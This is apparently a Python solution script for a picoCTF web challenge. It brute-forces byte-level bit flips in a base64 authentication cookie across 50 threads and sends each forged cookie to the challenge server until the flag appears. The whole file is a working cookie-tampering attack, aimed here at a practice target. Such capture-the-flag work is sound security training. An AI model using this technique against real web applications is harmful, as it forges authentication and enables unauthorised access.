import base64
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

cipher_b64 = "bjRMV0RKaVRMeTNmWjhJZThNZVF1NnNoZzYvRmdaTzB0SnRBTktqb0FJS1A4aDA0SjBOS1k2NXNXSC8rNmcyZ1lJZWE3MVFUMGFtdENGWVVOVWQ2ZzZnYlQ2cEgySjRiVEFDYUZkNjVZaEFpTlFXUGRpV0lzZjhNQWxQbVc3TDk="
cipher_bytes = base64.b64decode(cipher_b64)

target_url = "http://mercury.picoctf.net:21553/flag"
cookie_name = "auth_name"
verbose = True

def send_request(modified_bytes):
    new_b64 = base64.b64encode(modified_bytes).decode()
    cookies = {cookie_name: new_b64}
    resp = requests.get(target_url, cookies=cookies)
    return resp.text

def try_val(i, val):
    test_bytes = bytearray(cipher_bytes)
    test_bytes[i] = val
    response = send_request(test_bytes)
    
    if verbose:
        lines = response.splitlines()
        snippet = "\n".join(lines[1400:1400+80]) if len(lines) > 1400 else response
        print(f"Thử byte {i} = {val}: Response snippet (lines 1401-1480):\n{snippet}\n{'-'*30}")
    if "picoCTF{" in response:
        return (i, val, base64.b64encode(test_bytes).decode())
    return None

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = []
    for i in range(len(cipher_bytes)):
        for val in range(256):
            futures.append(executor.submit(try_val, i, val))
    for future in tqdm(as_completed(futures), total=len(futures)):
        result = future.result()
        if result:
            i, val, payload = result
            print(f"Thay đổi byte tại vị trí {i} thành {val} đã kích hoạt flag!")
            print("Payload mới base64:", payload)
            executor.shutdown(wait=False)
            exit(0)

print("Không tìm thấy bitflip hợp lệ.")
